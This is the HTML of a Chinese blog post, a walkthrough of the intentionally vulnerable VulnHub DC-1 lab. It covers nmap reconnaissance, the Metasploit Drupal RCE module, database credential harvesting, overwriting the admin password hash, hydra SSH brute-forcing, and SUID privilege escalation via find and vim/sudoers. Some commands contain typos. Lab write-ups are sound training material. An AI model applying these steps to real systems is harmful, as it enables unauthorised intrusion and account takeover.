@@ -1,0 +1,534 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>w3nx1z1 | w3nx1z1</title><meta name="author" content="w3nx1z1"><meta name="copyright" content="w3nx1z1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="vulnhub靶场记录DC-1靶机描述DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.  It was designed to be a challenge for beginners, but just how ea">
+<meta property="og:type" content="article">
+<meta property="og:title" content="w3nx1z1">
+<meta property="og:url" content="http://w3nx1z1.github.io/2023/10/31/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-1/index.html">
+<meta property="og:site_name" content="w3nx1z1">
+<meta property="og:description" content="vulnhub靶场记录DC-1靶机描述DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.  It was designed to be a challenge for beginners, but just how ea">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://w3nx1z1.github.io/img/mikey.png">
+<meta property="article:published_time" content="2023-10-31T12:47:36.472Z">
+<meta property="article:modified_time" content="2023-11-19T12:29:33.601Z">
+<meta property="article:author" content="w3nx1z1">
+<meta property="article:tag" content="w3nx1z1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://w3nx1z1.github.io/img/mikey.png"><link rel="shortcut icon" href="/img/%E8%87%AA%E7%94%B1%E4%B9%8B%E7%BF%BC.jpg"><link rel="canonical" href="http://w3nx1z1.github.io/2023/10/31/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'w3nx1z1',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-11-19 20:29:33'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="w3nx1z1" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/mikey.png" onerror="onerror=null;src='/img/404.jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/baobao.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="w3nx1z1"><span class="site-name">w3nx1z1</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-31T12:47:36.472Z" title="发表于 2023-10-31 20:47:36">2023-10-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-19T12:29:33.601Z" title="更新于 2023-11-19 20:29:33">2023-11-19</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="vulnhub靶场记录DC-1"><a href="#vulnhub靶场记录DC-1" class="headerlink" title="vulnhub靶场记录DC-1"></a>vulnhub靶场记录DC-1</h1><h2 id="靶机描述"><a href="#靶机描述" class="headerlink" title="靶机描述"></a>靶机描述</h2><pre><code>DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.
+
+It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.
+
+To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.
+
+There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.
+
+There are five flags in total, but the ultimate goal is to find and read the flag in root&#39;s home directory. You don&#39;t even need to be root to do this, however, you will require root privileges.
+
+Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.
+
+Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.
+</code></pre>
+<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>下载路径</p>
+<pre><code>https://download.vulnhub.com/dc/DC-1.zip
+</code></pre>
+<p> 使用vmware——文件——打开——导入DC-1.ova——创建靶机</p>
+<h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一-信息搜集-寻找真实ip-探端口及服务"><a href="#一-信息搜集-寻找真实ip-探端口及服务" class="headerlink" title="一.信息搜集(寻找真实ip 探端口及服务)"></a>一.信息搜集(寻找真实ip 探端口及服务)</h3><pre><code>目标探测，如：扫描域名、IP、开放端口、确认其使用的软件版本、框架版本等
+</code></pre>
+<p>我们只需要创建好靶机就可以了 不需要进行登陆 在渗透过程中 不需要登陆root用户 但是需要root权限</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028518.png" alt="image-20231031191735196"></p>
+<p>由于我们刚刚对于靶机的网络设置是NAT模式  所以靶机是自动获得IP 且和kali是在同一局域网下</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028767.png" alt="image-20231031191903572"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028423.png" alt="image-20231031192114585"></p>
+<p>可以看到 我们现在kali的ip是<code>192.168.160.131 </code> 那么我们可以使用nmap扫描kali的c段中存活的主机 来找到靶机的真实ip</p>
+<pre><code>nmap 192.168.160.0/24
+
+-sP：向目标发送 TCP ACK 的包，如果有响应，则表明目标处于活动状态；
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028564.png" alt="image-20231117174059741"></p>
+<p>找到靶机ip是<code>192.168.160.146</code></p>
+<p>接下来 在使用nmap探靶机开放的端口</p>
+<pre><code>nmap -T4 -sC -sV 192.168.160.146 或 nmap -A -p- -v 192.168.160.146
+
+-sV 参数：探测端口上运行的软件；
+-A 详细扫描
+-T4 设定时间强度
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028986.png" alt="image-20231031194656572"></p>
+<pre><code>开放了22端口 存在ssh服务 OpenSSH版本6.0普
+开放了80端口 存在web服务 使用apche httpd版本2.2.22 使用了Drupal7(CMS开源框架 使用php语言编写)
+开放了111端口 存在rpcbind服务器
+</code></pre>
+<p>这一步的操作使用</p>
+<pre><code>whatweb -v 192.168.160.146
+</code></pre>
+<p>也可以进行CMS识别</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028780.png" alt="image-20231031195321754"></p>
+<h3 id="二-信息分析"><a href="#二-信息分析" class="headerlink" title="二.信息分析"></a>二.信息分析</h3><p>开启了ssh服务 也许有弱口令 可以尝试爆破</p>
+<p>Drupal有公开的RCE漏洞 可以尝试进行验证利用</p>
+<h3 id="三-访问web站点"><a href="#三-访问web站点" class="headerlink" title="三.访问web站点"></a>三.访问web站点</h3><p>访问刚刚扫出来的web站点 是Drupal</p>
+<pre><code>192.168.160.146
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028740.png" alt="image-20231031200028158"></p>
+<p>使用<code>wappalyzer</code>插件查看网站的相关配置 发现和刚刚扫出来的配置是一样的</p>
+<h3 id="四-利用MSF-msfconsole-进行渗透"><a href="#四-利用MSF-msfconsole-进行渗透" class="headerlink" title="四.利用MSF(msfconsole)进行渗透"></a>四.利用MSF(msfconsole)进行渗透</h3><h4 id="1-msfconsole命令介绍"><a href="#1-msfconsole命令介绍" class="headerlink" title="1.msfconsole命令介绍"></a>1.msfconsole命令介绍</h4><pre><code>msfconsole		进入MSF控制台
+search 			搜索相应模块
+use           	对应模块
+show options  	查看信息
+set RHOST  		设置远程主机ip
+run           	攻击(启动模块)
+host            查看扫描记录
+back  			停止攻击(退出模块)
+save			保存模块配置
+show exploits/payloads  查看所有攻击模块/查找所有攻击载荷
+</code></pre>
+<h4 id="2-搜索Drupal7漏洞"><a href="#2-搜索Drupal7漏洞" class="headerlink" title="2.搜索Drupal7漏洞"></a>2.搜索Drupal7漏洞</h4><h5 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h5><p>先使用<code>searchsploit Drupal 7</code>搜索一下Drupal 7的漏洞 可以找到很多</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_63844103/article/details/128405733?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169875595316800184165844%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=169875595316800184165844&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-128405733-null-null.142%5Ev96%5Epc_search_result_base9&utm_term=searchsploit&spm=1018.2226.3001.4187">searchsploit使用介绍</a></p>
+<pre><code>Exploit-db是Kali linux 官方团队维护的一个安全项目，存储了大量的漏洞利用程序，是公认的世界上最大的搜集漏洞的数据库。它的在线版本是https://www.exploit-db.com/ 。而searchsploit可以利用exploit-db提供的数据库进行离线搜索
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028525.png" alt="image-20231031204251110"></p>
+<p>过滤一下 是7版本的漏洞</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028910.png" alt="image-20231031204347126"></p>
+<h4 id="3-使用msfconsole扫exp"><a href="#3-使用msfconsole扫exp" class="headerlink" title="3.使用msfconsole扫exp"></a>3.使用msfconsole扫exp</h4><p>msfconsole命令简单介绍</p>
+<pre><code>msfconsole		进入MSF控制台
+search *		搜索相应模块
+use *          	对应模块
+show options  	查看信息
+set RHOST  		远程主机ip
+run           	攻击
+show info       查看模块的详细信息
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311052139678.png" alt="image-20231105213954599"></p>
+<h5 id="搜索drupal模块"><a href="#搜索drupal模块" class="headerlink" title="搜索drupal模块"></a>搜索drupal模块</h5><pre><code>search drupal
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311052141123.png" alt="image-20231105214125065"></p>
+<h5 id="选中模块"><a href="#选中模块" class="headerlink" title="选中模块"></a>选中模块</h5><p>发现模块1是远程命令执行漏洞 使用模块1搞一下</p>
+<pre><code>use 1
+show options   查看详细信息
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028193.png" alt="image-20231117171533101"></p>
+<h5 id="设置靶机ip运行msf"><a href="#设置靶机ip运行msf" class="headerlink" title="设置靶机ip运行msf"></a>设置靶机ip运行msf</h5><pre><code>set RHOST 192.168.160.146  设置靶机ip
+run                        开始攻击
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028889.png" alt="image-20231117182012241"></p>
+<h4 id="4-进入shell"><a href="#4-进入shell" class="headerlink" title="4.进入shell"></a>4.进入shell</h4><p>exp运行成功 我们进入shell</p>
+<pre><code>shell
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028025.png" alt="image-20231117183849319"></p>
+<h4 id="5-flag1"><a href="#5-flag1" class="headerlink" title="5.flag1"></a>5.flag1</h4><p>进入目录 找到flag1</p>
+<pre><code>ls
+cat flag1.txt
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028574.png" alt="image-20231117183914026"></p>
+<pre><code>Every good CMS needs a config file - and so do you.
+翻译：每个优秀的内容管理系统(CMS)都需要配置文件，你也一样。
+</code></pre>
+<h4 id="6-flag2"><a href="#6-flag2" class="headerlink" title="6.flag2"></a>6.flag2</h4><p>flag1的内容提示我们寻找配置文件 </p>
+<p>我们先使用python反弹一个交互式shell</p>
+<pre><code>python -c &#39;import pty; pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028712.png" alt="image-20231117185938351"></p>
+<p>gpt做题法</p>
+<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231117190400954.png" alt="image-20231117190400954"></p>
+<p>找到<code>/var/www/sites/default/settings.php</code> 查看内容 找到flag2 还找到了数据库的配置文件</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028770.png" alt="image-20231117190903810"></p>
+<pre><code>flag2
+Brute force and dictionary attacks aren&#39;t the
+only ways to gain access (and you WILL need access).
+What can you do with these credentials?
+
+翻译：爆破和字典攻击并不是
+获得访问权限的唯一方式(你需要访问权限) 
+你能用这些证书做什么
+</code></pre>
+<h4 id="7-flag3"><a href="#7-flag3" class="headerlink" title="7.flag3"></a>7.flag3</h4><h5 id="进入数据库"><a href="#进入数据库" class="headerlink" title="进入数据库"></a>进入数据库</h5><p>flag2提示我们提升权限不能靠爆破和字典攻击  不知道上面提到的证书是什么意思</p>
+<p>但是我们知道数据库的信息了 就先看一下数据库</p>
+<pre><code>mysql -udbuser -p
+Enter password: R0ck3t
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028662.png" alt="image-20231117192340717"></p>
+<p>进入后 查数据库 查表 查字段 查内容  </p>
+<pre><code>show databases;
+use drupaldb;
+show tables;
+show columns from users;
+select name,pass from users;
+</code></pre>
+<p>可以找到admin用户的密码  但是一看就是加盐了</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029072.png" alt="image-20231117200258507"></p>
+<p>没关系 直接改成弱密码<code>123456</code>就行了</p>
+<p>但是再次之前 我们需要找到他的加密脚本 将加盐加密的<code>123456</code>放入数据库中</p>
+<p>在&#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028085.png" alt="image-20231117205111604"></p>
+<pre><code>$S$D/ckVXyCs7v65HPpFO/zG93O33n/wdyqQF7po2sOp07Dw5/I6X/P
+</code></pre>
+<p>再次进入数据库 更改密码</p>
+<pre><code>update users set pass=&#39;$S$D/ckVXyCs7v65HPpFO/zG93O33n/wdyqQF7po2sOp07Dw5/I6X/P&#39; where name=&#39;admin&#39;;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192028637.png" alt="image-20231117213946445"></p>
+<h5 id="登入网页"><a href="#登入网页" class="headerlink" title="登入网页"></a>登入网页</h5><p>使用<code>admin/123456</code>成功登陆</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029321.png" alt="image-20231117214115213"></p>
+<p>翻找网页内容 找到flag3</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029896.png" alt="image-20231117214212927"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029358.png" alt="image-20231117214430542"></p>
+<pre><code>flag3
+Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.
+翻译：特殊的权限可以帮助找到密码，但你需要执行该命令才能知道如何获取shadow中的内容。
+</code></pre>
+<h4 id="8-flag4"><a href="#8-flag4" class="headerlink" title="8.flag4"></a>8.flag4</h4><p>在&#x2F;home文件夹中找到flag4</p>
+<pre><code>flag4
+Can you use this same method to find or access the flag in root?                                                                                                                                                                                                 Probably. But perhaps it&#39;s not that easy.  Or maybe it is?
+翻译：
+你能用同样的方法找到或访问 root 中的flag吗？                                                                                                                                                                                                
+也许可以。但也许没那么容易。 又或许可以？
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191627932.png" alt="image-20231119162704880"></p>
+<p>flag3中提到shadow文件 但是一般情况来讲 查看shadow文件都需要使用root权限</p>
+<p>我们可以看到 现在是www-data权限 查看shadow文件 权限不够</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311192029539.png" alt="image-20231118204944510"></p>
+<p>但是我们可以查看passwd文件 可以看到确实是有flag4这个用户</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191631172.png" alt="image-20231119163126120"></p>
+<h5 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h5><p>这里学到一点 可以尝试使用hydra进行密码爆破 这里我们使用password.lst字典进行爆破</p>
+<pre><code>hydra -l flag4 -P /home/kali/Desktop/brutehash/password.lst ssh://192.168.160.146
+
+-l 指定用户名
+-P 加载密码字典（自定义)
+ssh://ip 指定使用协议和ip地址
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191723636.png" alt="image-20231119172333588"></p>
+<p>爆破出flag4的密码是<code>orange</code> </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191724043.png" alt="image-20231119172417992"></p>
+<p>登录成功 拿到flag4权限</p>
+<h4 id="9-thefinalflag"><a href="#9-thefinalflag" class="headerlink" title="9.thefinalflag"></a>9.thefinalflag</h4><h5 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h5><p>由flag4的提示  我们得知在&#x2F;root文件夹中还有一个flag  但是我们现在并没有root权限 </p>
+<p>由flag3的内容当作提示 我们想到需要进行权限的提升   在提示中提到了<code>-exec</code>命令 想到suid提权 在这里我们使用find命令</p>
+<h6 id="suid"><a href="#suid" class="headerlink" title="suid"></a>suid</h6><pre><code>suid是一种对二进制程序(我们执行的命令就是一种二进制程序)设置的特殊权限 设置了suid权限的程序 在用户执行该程序时 用户的权限是该程序属主的权限 如果程序属主是root权限 那么执行该程序的用户就将暂时获得root权限
+要注意：
+1. SUID权限只能设置二进制文件
+2. 命令执行者要有二进制文件的执行权
+3. 命令执行者执行二进制文件时会获得该程序的属主身份
+4. SUID权限只在程序执行中有效
+</code></pre>
+<h6 id="find"><a href="#find" class="headerlink" title="find"></a>find</h6><pre><code>一、按名称或正则表达式查找文件
+格式：find . -name test.txt     // .符号代表路径 test.txt的位置放想要查找的文件名字
+find . -name &quot;*.txt&quot;           // 使用正则表达式 查找所有txt文件
+find . -type f -name &quot;*.txt&quot;   // 最好还是使用-type指定查找普通文件 以使所有内容更清晰
+
+// -type参数的一些用法
+字母	文件类型
+b	block (buffered) special
+c	character (unbuffered) special
+d	directory（目录）
+p	named pipe (FIFO)（命名管道）
+l	symbolic link; this is never true if the -L option or the -follow option is in effect, unless the symbolic link is broken.       If you want to search for symbolic links when -L is in effect, use -xtype. （软连接；如果-L或者-follow选项生效，这个字母就不能用，除非     软连接断开了。如果你想在-L生效的时候，搜索软连接，使用-xtype选项）
+f	regular file（普通文件）
+s	socket
+D	door (Solaris)
+//
+
+二、查找不同类型的文件
+我们可以使用不同的-type参数 来查找不同类型的文件 
+find . -type d -name &quot;w3n*&quot;    // 使用 d 参数 查找所有名字中含有 w3n 的目录
+find . -type l -name &quot;w3n*&quot;    // 使用 l 参数 查找所有名字中含有 w3n 的符号链接
+
+三、按特定的时间戳查找文件
+linux中三种不同的时间戳：
+访问时间戳(atime)：最后一次读取文件的时间
+修改时间戳(mtime)：文件内容最后一次修改时间
+更改时间戳(ctime)：上次更改文件元数据的时间 例如所有权、位置、文件类型等
+
++ 是大于 -是小于
+find . -type f -atime +365    // 查找最后一次访问时间超过一年的文件
+find . -type f -mtime 5       // 查找最后一次修改时间为5天前的文件
+find . -type f -ctime +5 -ctime -10  // 查找上次更改元数据时间为5到10天前的文件
+
+四、按大小查找文件
+-size参数可以帮助我们按照文
+b: 512 字节（默认）
+c: 字节
+w: 两字节字
+k: 千字节
+M: 兆字节
+G: 千兆字节件大小来进行查找
+find . -type f -size +10M -size -1G   // 查找文件大小大于10M 小于1G的文件
+
+五、按权限查找文件
+-perm可以帮助我们按特定权限查找文件
+
+//常见的权限数字
+444 r--r--r--
+600 rw-------
+644 rw-r--r--
+666 rw-rw-rw-
+700 rwx------
+744 rwxr--r--
+755 rwxr-xr-x
+777 rwxrwxrwx
+从左至右，
+1-3位数字代表文件所有者的权限，
+4-6位数字代表同组用户的权限，
+7-9数字代表其他用户的权限。
+读取权限：等于4 用 r 表示
+写入权限：等于2 用 w 表示
+执行权限：等于1 用 x 表示
+eg.
+755 
+7: 4+2+1 文件所有者拥有读取、写入、执行权限
+5：4+0+1 同组用户拥有读取、执行权限
+5:4+0+1 其他用户拥有读取、执行权限
+//
+
+find . -type f -perm 777   // 查找所有具有777权限的文件 这意味着这些文件对其所有者、组和所有用户具有所有的读、写和可执行权限
+
+六、按所有权查找文件
+-user可以让我们按照所有权查找文件
+find . -type f -user w3nx1z1  // 查找所有所有权是w3nx1z1的文件
+
+七、找到文件后执行命令
+使用-exec
+在Linux中，exec是一个用于替换当前进程的系统调用 当一个进程调用exec时，它会被一个新的程序所替代，而新程序将从其main函数或入口点开始执行。这意味着原始进程的代码、数据和堆栈都会被新程序的相应部分所取代，从而实现了进程的自我替换。
+在使用-exec命令时 必须要注意严格遵守以下格式： -exec 命令 &#123;&#125; \;
+find . -type f -atime +5 -exec ls &#123;&#125; \;    // 查找所有最后访问时间超过5天的文件 并将其列出
+find . -type f -atime +365 -exec rmm -rf &#123;&#125; \;  // 查找所有最后访问时间超过一年的文件 并将其删除
+find /etc -type f -name &quot;passwd&quot; -exec grep &quot;root&quot; &#123;&#125; \;   // 查找在/etc文件夹下名为&quot;passwd&quot;的文件 并使用grep查找其中是否有名为&quot;root&quot;的用户
+</code></pre>
+<p>现在我们已经了解了一点关于suid提权的基本内容 再来看一下suid提权的具体操作</p>
+<h6 id="设置-x2F-去掉suid"><a href="#设置-x2F-去掉suid" class="headerlink" title="设置&#x2F;去掉suid"></a><strong>设置&#x2F;去掉suid</strong></h6><pre><code>chmod u+s filename 设置suid位
+chmod u-s filename 去掉suid位
+</code></pre>
+<h6 id="查找suid"><a href="#查找suid" class="headerlink" title="查找suid"></a><strong>查找suid</strong></h6><pre><code>find / -type -perm -u=s(或者-4000) 2&gt;dev/null
+</code></pre>
+<h6 id="find命令提权"><a href="#find命令提权" class="headerlink" title="find命令提权"></a><strong>find命令提权</strong></h6><p>如果find命令不是suid权限 先给find命令设置suid权限</p>
+<pre><code>chmod u+s /bin/usr/find
+</code></pre>
+<p>进行提权</p>
+<pre><code>find 已有文件名 -exec whoami \;
+</code></pre>
+<h6 id="vim命令提权"><a href="#vim命令提权" class="headerlink" title="vim命令提权"></a><strong>vim命令提权</strong></h6><p>赋予vim suid权限</p>
+<pre><code>chmod u+s /bin/vim
+</code></pre>
+<p>使用vim在&#x2F;etc&#x2F;sudoers中创建一个用户</p>
+<pre><code>vim /etc/sudoers
+</code></pre>
+<p>格式和root用户一样</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311191551346.png" alt="image-20231119155142302"></p>
+<pre><code>su - test
+sudo bash
+whoami
+</code></pre>
